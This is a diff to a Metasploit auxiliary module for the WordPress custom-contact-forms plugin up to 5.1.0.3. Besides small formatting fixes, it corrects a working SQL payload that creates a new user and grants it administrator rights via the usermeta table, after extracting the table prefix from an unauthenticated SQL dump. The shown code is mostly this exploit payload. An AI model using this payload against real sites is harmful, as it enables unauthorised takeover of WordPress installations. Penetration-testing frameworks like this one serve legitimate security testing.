@@ -13,10 +13,10 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
           The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download
           a SQL dump of the plugins database tables. It's also possible to upload files containing
-          sql statements which will be executed. The module first tries to extract the WordPress
+          SQL statements which will be executed. The module first tries to extract the WordPress
           table prefix from the dump and then attempts to create a new admin user.
       },
-      'Author'	=>
+      'Author' =>
         [
           'Marc-Alexandre Montpas', # Vulnerability discovery
           'Christian Mehlmauer' # Metasploit module
@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
     # create user
     sql = "INSERT INTO #{table_prefix}users (user_login, user_pass) VALUES ('#{username}','#{Rex::Text.md5(password)}');"
     # make user administrator
-    sql << "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}'),((select id from #{table_prefix}users where user_login='#{username}'),'wp_user_level','10');"
+    sql << "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}capabilities','a:1:{s:13:\"administrator\";b:1;}'),((select id from #{table_prefix}users where user_login='#{username}'),'#{table_prefix}user_level','10');"
 
     sql
   end
